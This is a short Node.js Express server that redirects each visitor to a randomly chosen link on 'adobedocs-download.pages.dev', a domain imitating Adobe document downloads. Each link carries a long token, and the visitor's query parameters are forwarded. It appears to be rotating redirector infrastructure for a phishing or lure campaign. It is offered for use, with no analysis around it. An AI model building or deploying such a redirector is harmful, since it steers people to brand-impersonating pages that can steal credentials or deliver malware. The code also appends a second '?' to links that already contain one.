const express = require("express");
const app = express();

const PORT = process.env.PORT || 3000; // Render assigns a PORT dynamically

// List of URLs for redirection
const urls = [
    "https://main.adobedocs-download.pages.dev/?6jxin7p4u3xoo5f9nw6artiwe8cx647xk51qzi5uqu5dgrnqfpoj7gmjl8224c",
    "https://7b3b46f2.adobedocs-download.pages.dev/?neyjncjsba5zhcoz54bf2swxs5bafybeig2rf5ebepfrekhfc7rd52b2ibi",
    "https://main.adobedocs-download.pages.dev/?l8224c6jxin7p4u3xoo5f9nw6ark51qzi5uqu5dgrnqfpoj7gmjtiwe8cx647x"
];

// Route to handle redirection
app.get("/", (req, res) => {
    // Select a random URL
    const selectedUrl = urls[Math.floor(Math.random() * urls.length)];

    // Append query parameters from request
    const queryParams = req.originalUrl.includes("?") ? req.originalUrl.split("?")[1] : "";
    const redirectUrl = queryParams ? `${selectedUrl}?${queryParams}` : selectedUrl;

    console.log(`Redirecting to: ${redirectUrl}`);
    
    res.redirect(302, redirectUrl);
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
